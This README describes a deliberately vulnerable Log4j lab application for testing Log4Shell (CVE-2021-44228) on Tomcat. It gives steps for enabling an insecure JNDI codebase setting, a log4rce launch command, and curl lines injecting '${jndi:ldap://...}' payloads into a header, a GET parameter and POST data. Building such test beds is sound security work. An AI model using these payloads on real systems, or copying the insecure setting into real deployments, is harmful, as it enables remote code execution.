# Damn Vulnerable Log4j App

## Why this application?
We wanted a way to test the CVE-2021-44228 / log4shell vulnerability. https://github.com/christophetd/log4shell-vulnerable-app is great, and the docker packaging makes it quick and easy to deploy for testing. However, we wanted a Windows-compatible version that could be deployed on a server like Tomcat.

## Why are there two versions?
Excuse our ignorance as we are not from the Java world. There appears to be a schism that disrupted a lot of package namespaces. The [Tomcat 10 download page](https://tomcat.apache.org/download-10.cgi) even warned of this:

> Users of Tomcat 10 onwards should be aware that, as a result of the move from Java EE to Jakarta EE as part of the transfer of Java EE to the Eclipse Foundation, the primary package for all implemented APIs has changed from javax.* to jakarta.*. This will almost certainly require code changes to enable applications to migrate from Tomcat 9 and earlier to Tomcat 10 and later.

Use `damn-vulnerable-log4j-app-java17` if you are using the latest version of Java and Jakarta EE.

Use `damn-vulnerable-log4j-app-java8` if you are using Java 8 (1.8) and Java EE.

Compiled versions are available under the releases tab.

## How do I deploy it (for Java 17 / Tomcat 10)?
1. Install Tomcat 10 https://tomcat.apache.org/download-10.cgi. We tested with 10.0.14, but others may work.
2. Install a JDK/JRE.  We used JDK 17.0.1 from https://www.oracle.com/java/technologies/downloads/. Older versions require you to create an Oracle account.
3. Set your JAVA_HOME or JRE_HOME (this can be done in the Tomcat `bin\startup.bat` file via `set JAVA_HOME=C:\Program Files\Java\jdk_17.0.1`. You could also set it globally via `rundll32.exe sysdm.cpl,EditEnvironmentVariables`.
4. **IMPORTANT** for newer versions of Java (e.g., JDK versions greater than 6u211, 7u201, 8u191, and 11.0.1), you will have to configure the `com.sun.jndi.ldap.object.trustURLCodebase=true` for the attack to work. Yes, this would not be done in "production" environments, but we're making this POC more friendly for newer versions of Java. This insecure configuration is present in those older versions of Java, which is why the exploit works. The easiest way to set this variable is adding `set CATALINA_OPTS=-Dcom.sun.jndi.ldap.object.trustURLCodebase=true` to the `bin\startup.bat` file.
5. Copy the .war file into `bin\webapps` and start Tomcat with `bin\startup.bat`. Tomcat will automatically expand the archive and deploy the app to a folder based on the archive name (so log4j.war goes to http://localhost:8080/log4j).

## The exploit doesn't seem to work?
If you see the initial LDAP request, but not a secondary request to grab the exploit class, then you likely need to set `com.sun.jndi.ldap.object.trustURLCodebase=true`. See the note in step 4 above for more details.

## How do I deploy it (for Java 1.8 / Tomcat 9)?
1. Install Tomcat 9 https://tomcat.apache.org/download-90.cgi. We tested with 9.0.56, but others may work.
2. Install a JDK/JRE.  We used JDK 1.8.181 from https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html. Older versions require you to create an Oracle account.
3. Set your JAVA_HOME or JRE_HOME (this can be done in the Tomcat `bin\startup.bat` file via `set JAVA_HOME=C:\Program Files\Java\jdk_1.8.0_181`. You could also set it globally via `rundll32.exe sysdm.cpl,EditEnvironmentVariables`.
4. **IMPORTANT** for older versions of Java (e.g., JDK versions at 6u211, 7u201, 8u191, and 11.0.1 or below), the variable `com.sun.jndi.ldap.object.trustURLCodebase` is in an insecure state and allows the attack to work. Newer versions would require this to be changed (see step 4 above for example),
5. Copy the .war file into `bin\webapps` and start Tomcat with `bin\startup.bat`. Tomcat will automatically expand the archive and deploy the app to a folder based on the archive name (so log4j.war goes to http://localhost:8080/log4j)

## How do I exploit this?
We used https://github.com/alexandre-lavoie/python-log4rce as it's simple to use and doesn't have any complex requirements.

Simply clone the repo and launch `python3 log4rce.py --payload "cmd.exe /c calc.exe" manual` and you can start poppin' calcs.

There are three API endpoints where you can use payload (URLs work assuming you kept the log4j.war file name or didn't move the base path):

1) http://localhost:8080/log4j/api/vulnerable/user - This logs the 'User-Agent' HTTP header.  You can attack it with something like `curl -A '${jndi:ldap://127.0.0.1:1387/Exploit}' http://localhost:8080/log4j/api/demo/user`

2) http://localhost:8080/log4j/api/vulnerable/get - This logs the 'x' HTTP GET parameter.  You can attack it with something like `curl -G  --data-urlencode 'x=${jndi:ldap://127.0.0.1:1387/Exploit}' http://localhost:8080/log4j/api/vulnerable/get`

3) http://localhost:8080/log4j/api/vulnerable/post - This logs any www-form-urlencoded POST data.  You can attack it with something like `curl -d 'foo=${jndi:ldap://127.0.0.1:1387/Exploit}' -X POST http://localhost:8080/log4j/api/vulnerable/post`

One of the more popular POCs, https://github.com/pimps/JNDI-Exploit-Kit, does not work out of the box for Java 17 / Tomcat 10 as it targets older versions of Java. It would work though against the Java 1.8 / Tomcat 9 version of the app.